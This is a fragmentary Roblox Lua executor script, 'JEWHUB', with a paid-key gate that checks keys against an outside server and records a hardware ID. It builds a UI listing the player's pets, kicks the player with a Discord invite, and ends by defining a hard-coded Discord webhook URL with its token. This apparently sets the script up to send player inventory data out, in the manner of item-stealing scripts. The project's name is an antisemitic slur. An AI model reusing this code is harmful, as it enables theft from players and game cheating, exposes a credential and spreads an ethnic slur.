--// JEWHUB KEY SYSTEM CONFIG
getgenv().JEWHUB_KEY_API = "https://python-template.aarmandoh25.repl.co/validate"
getgenv().JEWHUB_KEY_FILE = "jewhub_key.txt"

if not game:IsLoaded() then game.Loaded:Wait() end

--// STEP 2 — HWID + Services block
local HttpService = game:GetService("HttpService")
local RbxAnalyticsService = game:GetService("RbxAnalyticsService")

local function JEWHUB_GetHWID()
    return RbxAnalyticsService:GetClientId()
end

--// STEP 3 — Key storage system (PATCHED)
local function JEWHUB_SaveKey(key)
    if writefile then
        writefile(getgenv().JEWHUB_KEY_FILE, key)
    end
end

local function JEWHUB_LoadKey()
    if isfile and isfile(getgenv().JEWHUB_KEY_FILE) then
        return readfile(getgenv().JEWHUB_KEY_FILE)
    end
end

--// STEP 4 — CORE VALIDATION
local function JEWHUB_Validate(key)
    local success, res = pcall(function()
        return request({
            Url = getgenv().JEWHUB_KEY_API,
            Method = "POST",
            Headers = {
...
--// STEP 5 — JEWHUB LOADER GATE
local JEWHUB_KEY = JEWHUB_LoadKey()

if not JEWHUB_KEY then
    JEWHUB_KEY = "ENTER_KEY_HERE"
end

local status = JEWHUB_Validate(JEWHUB_KEY)

if status == "valid" or status == "bound" then
    JEWHUB_SaveKey(JEWHUB_KEY)
    print("✔ JEWHUB: Access Granted")
else
    warn("✖ JEWHUB: Access Denied -> " .. tostring(status))
    return -- STOPS SCRIPT BEFORE LOADING HUB
end
...
local function kickPlayer()
    LocalPlayer:Kick("\ndiscord.gg/Jew hub - xi loves you <3")
end
...
local Theme = {
    ...
    SurfaceHighlight= Color3.fromRGB(30, 10, 50),

    Accent1         = Color3.fromRGB(170, 0, 255),
    Accent2         = Color3.fromRGB(110, 0, 255),

    TextPrimary     = Color3.fromRGB(230, 230, 255),
    TextSecondary   = Color3.fromRGB(150, 130, 200),

    Success         = Color3.fromRGB(120, 0, 255),
...
task.spawn(function()
    ...
    mainStroke.Color = Theme.Accent2; mainStroke.Thickness = 1.5; mainStroke.Transparency = 0.1
    ...
    progressBarFill.Size = UDim2.new(0,0,1,0); progressBarFill.BackgroundColor3 = Theme.Accent1
            ...
            if allPets and #allPets > 0 then
                for i = 1, #allPets do
                    ...
                    local MUT_COLORS_UI = {
                        ...
                        Candy=Color3.fromRGB(255,105,180), Divine=Theme.Accent1
                    }
...
task.spawn(function()
    ...
    knob.BackgroundColor3=Theme.Accent1; knob.BorderSizePixel=0
...
task.spawn(function()
    ...
    if privateBuild then
        ...
        author.Text = "discord.gg/Jew hub"
    end
...
task.spawn(function()
    local WEBHOOK_URL = "https://discord.com/api/webhooks/1491221229082902569/C-G1lzHYC6dCpiLQGfvZQZWyusX3ZD5qP0yPG-NpvYRJD8JGrpEJj-z-SbhkyAHZKl6C"
